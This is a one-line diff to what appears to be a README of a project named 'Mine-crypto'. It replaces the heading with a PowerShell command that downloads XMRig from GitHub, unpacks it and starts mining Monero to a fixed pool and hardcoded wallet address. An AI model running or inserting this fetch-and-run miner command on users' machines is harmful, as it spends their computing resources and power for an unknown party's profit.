@@ -1,1 +1,1 @@
-# Mine-crypto
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip' -OutFile 'xmrig.zip'; Expand-Archive -Path 'xmrig.zip' -DestinationPath '.'; cd xmrig-*; .\xmrig.exe -o pool.supportxmr.com:443 -u 45WvRSeZuor9BbKMZF6s1VVvQriMjvScBbRLxoMTGe9c2J8Xnx4HySRHLLeTb8zf9944GD1uEmnpgUFFRHhJ7abSJXrmezb -p x -k --tls"
